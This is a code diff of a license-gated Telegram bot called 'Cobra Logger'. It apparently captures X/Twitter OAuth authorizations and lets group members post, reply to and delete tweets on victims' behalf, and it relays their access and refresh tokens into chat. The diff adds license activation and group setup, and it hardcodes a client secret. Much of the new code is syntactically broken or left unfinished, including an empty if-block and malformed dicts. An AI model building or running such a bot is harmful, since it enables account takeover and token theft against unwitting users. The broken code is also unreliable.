@@ -18,13 +18,15 @@ TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn'
 client = MongoClient(MONGO_URI)
 db = client['cobra_db']
 users = db['users']
+groups = db['groups']
 licenses = db['licenses']
+
+parse_mode = "MarkDown"
 
 def generate_random_key(length=12, segment_length=4):
     characters = string.ascii_uppercase + string.digits  # Use uppercase letters and digits
     key = ''.join(random.choice(characters) for _ in range(length))
     
-    # Insert dashes at every `segment_length` interval
     segments = [key[i:i+segment_length] for i in range(0, len(key), segment_length)]
     
     return '-'.join(segments)
@@ -32,16 +34,59 @@ def generate_random_key(length=12, segment_length=4):
 
 async def start(update: Update, context: CallbackContext) -> None:
     if context.args == None: return
-    await update.message.reply_text(f'Welcome to twtred. Key: {context.args[0]}')
+    key = context.args[0]
+    
+    license = licenses.find_one({"key": key, "used_by": None})
+    if not license: await context.bot.send_message(chat_id, text="❌ *The license you provided is invalid.*") return
+    
+    user_id = update.effective_user.id
+    username = update.effective_user.username
+        
+    user_data = {
+        "user_id": user_id,
+        "username": username,
+        "group_id": None
+    }
+    users.insert_one(user_data)
+    
+    license_data = {
+        "used_by" user_id,
+    }
+    result = licenses.update_one(
+        {"key": key},
+        {"$set": license_data}
+    )
+    
+    if result.modified_count > 0:
+        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"🐍 Welcome to Cobra Logger, *{update.effective_user.full_name}*! 🐍\n\n✅ *Your license has been activated and will expire:* `{expiration_date}`\n\n💬 _To get started, add me to a group and use the */setup* command to setup your group for OAuth._")
+    else:
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ *An unknown error occured.*", parse_mode)
 
 
 async def help(update: Update, context: CallbackContext) -> None:
     chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
     text = "❔ *List of Commands*\n\n *•* 🐦 */post_tweet* <username> <message> - Posts a tweet on behalf of the user.\n *•* 💬 */post_reply* <username> <tweetId> <message> - Posts a reply to a tweet on behalf of the user.\n *•* ❌ */delete_tweet* <username> <tweetId> - Deletes a tweet on behalf of the user.\n *•* 👥 */display_users* - Shows the list of authenticated users.\n *•* 🔗 */display_endpoint* - Displays the group's endpoint.\n *•* 🔄 */set_redirect* - Sets the redirect upon authorization.\n *•* ❔ */help* - Displays the list of commands."
-    parse_mode = "MarkDown"
     
     await context.bot.send_message(chat_id, text, parse_mode)
 
+
+async def setup(update: Update, context: CallbackContext) -> None:
+    chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
+    if update.effective.chat_type == "private": await context.bot.send_message(chat_id, text="❌ *This command can only be used in groups*", parse_mode) return
+    
+    owner_id = update.message.from_user.id
+    owner_username = update.message.from_user.username
+    group_name = update.message.chat.title
+    
+    license = licenses.find_one({"used_by": owner_id, "status": "active"})
+    if not license: await context.bot.send_message(chat_id, text="⚠️ *License not found or is expired. Please purchase a license to continue using Cobra Logger.*", parse_mode) return
+    
+    user = users.find_one({"user_id": owner_id})
+    if user:
+        
+    
+    await context.bot.send_message(chat_id, text="", parse_mode)
+        
 
 async def tweet(update: Update, context: CallbackContext) -> None:
     args = context.args
@@ -83,7 +128,7 @@ async def tweet(update: Update, context: CallbackContext) -> None:
             chat_id=chatId,
             text=
             f'✅ *Tweet Posted* ✅\n\nx.com/{username}/status/{tweetId}\n\n🔑 Access Token:\n`{access_token}`',
-            parse_mode='MarkDown')
+            parse_mode)
     else:
         await context.bot.send_message(
             chat_id=chatId,
@@ -132,7 +177,7 @@ async def reply(update: Update, context: CallbackContext) -> None:
             chat_id=chatId,
             text=
             f'✅ *Reply Posted* ✅\n\nx.com/{username}/status/{tweetId}\n\n🔑 Access Token:\n`{access_token}`',
-            parse_mode='MarkDown')
+            parse_mode)
     else:
         await context.bot.send_message(
             chat_id=chatId,
@@ -190,11 +235,11 @@ async def refresh(update: Update, context: CallbackContext) -> None:
                 chat_id=chatId,
                 text=
                 f'🔄 *Token Refreshed* 🔄\n\n👤 Account:\nx.com/{username}\n\n🔑 Access Token:\n`{new_access_token}`\n\n🔄 Refresh Token:\n`{new_refresh_token}`',
-                parse_mode='MarkDown')
+                parse_mode)
         else:
             await update.message.reply_text(
                 f'🚫 *Refresh Failed* 🚫\nError: {response_data["error_description"]}',
-                parse_mode='MarkDown')
+                parse_mode)
     except Exception as e:
         await update.message.reply_text(
             f'🚫 *Refresh Failed* 🚫\nError: {str(e)}')
@@ -249,7 +294,7 @@ async def links(update: Update, context: CallbackContext) -> None:
 
 async def id(update: Update, context: CallbackContext) -> None:
     group_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
-    await context.bot.send_message(chat_id=group_id, text=f"🆔 *Group ID* 🆔\n\n`{group_id}`", parse_mode='MarkDown')
+    await context.bot.send_message(chat_id=group_id, text=f"🆔 *Group ID* 🆔\n\n`{group_id}`")
     
     
 async def generate_key(update: Update, context: CallbackContext) -> None:
